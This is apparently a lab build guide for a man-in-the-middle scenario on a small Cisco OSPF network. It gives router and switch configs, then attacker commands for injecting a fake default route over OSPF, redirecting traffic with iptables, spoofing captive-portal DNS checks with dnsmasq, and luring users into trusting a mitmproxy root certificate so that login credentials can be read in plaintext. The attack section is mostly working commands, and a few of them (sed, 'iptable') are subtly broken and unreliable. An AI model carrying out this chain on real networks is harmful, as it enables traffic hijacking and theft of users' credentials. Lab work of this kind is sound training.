# To add to scenario
```
Attacker uses a Wifi adapter to connect his PC to his hotspot which is then used as the internet facing gateway to direct traffic out
```

# Network Topo setup
Square shape setup

ISP
|
|
R1 ------  R2
|           |
|           |
|           |
DSW1 ---- DSW2

Interconnected vis OSPF (no HSRP - increase complexity)

DSW1 interface facing access switch (SVI with ospf routing misconfigured - causes SVI to forward broadcast OSPF packets to network)

# To add to scenario
```
Attacker uses a Wifi adapter to connect his PC to his hotspot which is then used as the internet facing gateway to direct traffic out
```
Attacker in that network able to receive and send OSPF LSA packets and establish himself as shortest path


## Router 1 Configuration Commands

```
en

conf t

hostname R1

no ip domain lookup

# Link to ISP
int g0/1/0
desc Link to ISP
ip addr <ISP IP> <255.255.255.252>
no shut

# Link to R2
int g0/0/0
desc Link to R2
ip addr 10.1.12.1 255.255.255.252
no shutdown

# Link to DSW1
int g0/0/1
desc Link to DSW1
ip addr 10.1.13.1 255.255.255.252
no shut

# Default route
ip route 0.0.0.0 0.0.0.0 <ISP IP>

# OSPF
router OSPF 1
router-id 1.1.1.1
network 10.1.12.0 0.0.0.3 area 0
network 10.1.13.0 0.0.0.3 area 0
default-information originate
```

## Router 2 Configuration Commands
```
en

conf t

hostname R2

no ip domain lookup

# Link to R1
int g0/0/0
desc Link to R1
ip addr 10.1.12.2 255.255.255.252
no shut

# Link to DSW2
int g0/0/1
desc Link to DSW2
ip addr 10.2.24.1 255.255.255.252
no shut

router ospf 1
router-id 2.2.2.2
network 10.1.12.0 0.0.0.3 area 0
network 10.2.24.0 0.0.0.3 area 0
```

## DSW1 Configuration Commands

```
ip routing

int g1/0/1
desc Link to R1
no switchport
ip addr 10.1.13.2 255.255.255.252
no shut

int g1/0/2
desc Link to DSW2
no switchport
ip addr 10.1.34.1 255.255.255.252
no shut

vlan 10
name Staff_VLAN

int vlan 10
desc Staff Gateway
ip addr 192.168.10.1 255.255.255.0
no shut

int g1/0/24
desc Downlink to ASW1
switchport mode access
switchport access vlan 10
no shut

router ospf 1
router-id 3.3.3.3
network 10.1.13.0 0.0.0.3 area 0
network 10.1.34.0 0.0.0.3 area 0
network 192.168.10.0 0.0.0.255 area 0
```

## DSW2 Configuration Commands

```
ip routing

int g1/0/1
desc Link to R2
no switchport
ip addr 10.2.24.2 255.255.255.252
no shut

int g1/0/2
desc Link to DSW1
no switchport
ip addr 10.1.34.2 255.255.255.252
no shut

vlan 20
name <Some name>

int vlan 20
desc Downlink to ASW2
switchport mode access 
switchport access vlan 20
no shut

router ospf 1
router-id 4.4.4.4
network 10.2.24.0 0.0.0.3 area 0
network 10.1.34.0 0.0.0.3 area 0
```

## Access switch Configuration

ASW1
```
vlan 10
name Staff_VLAN

int g1/0/24
desc Uplink to DSW1

int range g1/0/1-24
switchport mode access
switchport access vlan 10
no shut

# Now attacker can plug into any interface on ASW1
# Plug victim into any interface too
```

ASW2
```
# Same as ASW1 but change desc and vlan 10 to vlan 20
# Plug victim machine into any interface
```

## Setting up Hosts

# Route internal NIC to WLAN NIC using IPTABLES
```
# Enable IP Forwarding
## Temporarily
sudo sysctl -w net.ipv4.ip_forward=1
## Permanent
sudo sed -i '#net.ipv4.ip_forward=1' 'net.ipv4.ip_forward=1'

# Check that only wlan0 has default route (delete default route for eth0 if exists)
ip route

sudo ip route del default via <ip_addr> dev eth0 proto static metric <metric value>

# Configure IPTABLE
sudo iptable -t nat -A PREROUTING -i eth0 -p tcp --dport 80 -j REDIRECT --to-ports 8080
sudo iptable -t nat -A PREROUTING -i eth0 -p tcp --dport 443 -j REDIRECT --to-ports 8080
sudo iptables -A FORWARD -m state --state ESTABLISHED,RELATED -j ACCEPT
sudo iptables -A FORWARD -i eth0 -o wlan0 -j ACCEPT
sudo iptables -t nat -A POSTROUTING -o wlan0 -j MASQUERADE
# Check IPTABLE
sudo iptables -t nat -L -v -n
```

# Kali
```
# Setting static IP

nmcli connection show

#Find name at eth0 interface (i.e. Wired Connection 1)
sudo nmcli connection modify "Wired Connection 1" ipv4.address 192.168.10.100/24 ipv4.gateway 192.168.10.1 ipv4.method manual [ipv4.dns <something>]

sudo nmcli connection down "Wired Connection 1" && sudo nmcli connectoin up "Wired Connection 1"


<!-- Skip, using custom python script -->
<!-- #FRR setup -->
<!-- sudo apt update && sudo apt install frr -->
<!---->
<!-- sudo sed -i 's/ospfd=no/ospfd=yes/' /etc/frr/daemon (check write perms) -->
<!---->
<!-- sudo systemctl start frr -->
<!---->
<!-- sudo vtysh -->
<!---->
<!-- conf t -->
<!---->
<!-- # Init ospf process -->
<!-- router ospf -->
<!--     ospf router-id 100.100.100.100 -->
<!--     network 192.168.10.0/24 area 0 -->
<!--     # Inject fake default route into OSPF database (metric-type 1 to take precedence over router's default metric value 1) -->
<!--     default-information originate always metric-type 1 metric 1 -->
<!-- end -->
<!---->
<!-- # Write to mem  -->
<!-- write memory -->
<!-- exit -->

# Run ospf-injector.py with root perms
sudo python ./ospf-injector.py -h
sudo python ./ospf-injector.py <interface> <router-id> [--dict | wordlist to use]

# Verification
On DSW1
sh ip ospf neighbour
|
# Expect to see own router-id with FULL state
|
sh ip route ospf
|
# Expect to see kali ip as default route

On DSW2
sh ip route ospf
|
# Expect to see default route point to DSW1 at 10.1.34.1 with advertised metric of 10

Victim
Set from Ethernet settings
```

# Configure Fake DNS

```
### Targetting captive portal request (msftconnecttest.com for windows) ###
### Intercept that DNS request and send spoofed response tricking the host into thinking that there is a captive portal ###
### Use DNSMASQ to redirect DNS request for msftconnecttest.com to attacker web server ###
# Add Kali Attacker to dnsmasq config
sudo vim /etc/dnsmasq.conf

# In /etc/dnsmasq.conf
interface=eth0
bind-interfaces

/* add more domains if needed */
/* Chrome */
address=/msftconnecttest.com/<kali ip>
address=/www.msftconnecttest.com/<kali ip>
/* Firefox - may look for http://detectportal.firefox.com/success.txt */
address=/detectportal.firefox.com/<kali ip>
/* IOS/MacOS - http://captive.apple.com/hotspot-detect.html */
address=/captive.apple.com/<kali ip>
address=/appleiphonecell.com/<kali ip>
address=/ibook.info/<kali ip>
address=/airport.us/<kali ip>
/* Android - url/generate_204 */
address=/connectivitycheck.gstatic.com/<kali ip>
address=/clients3.google.com/<kali ip>
address=/www.gstatic.com/<kali ip>


sudo systemctl restart dnsmasq

# In /var/www/html
#Create index.html
touch index.html (add ur own shit ig)

sudo vim /etc/apache2/site-enabled/000-default.conf

#Add `FallbackResource /index.html` <- this will cause HTTP request to msftconnecttest.com/redirect to our index.html

### Add custom generated certificate into index.html as a downloadable link

# Redirect DNS traffic to Attacker machine (after OSPF Hijack successful)
sudo iptables -t nat -A PREROUTING -p udp --dport 53 -j REDIRECT --to-port 53
```

# MITMPROXY SETUP
```
# Setup MITMPROXY
mitmproxy

# Cert files will be generated under ~/.mitmproxy
place `.cer` certfile as download link in spoofed captive portal
rename certfile too
```

# Users install 
```
Get users to install cert under `Trusted Root Certication Authorities`
```

# Run mitm
`mitmproxy -w flows.mitm --listen-host 0.0.0.0 -p 8080`

# Testing
```
# Start wireshark

# User visits https://practice.expandtesting.com/login

# and enters some credential

# in MITMPROXY, look for POST request to /authenticate and see credentials in plaintext

# For proof, check wireshark tls filter to practice.expandtesting.com and see encrypted traffic
```
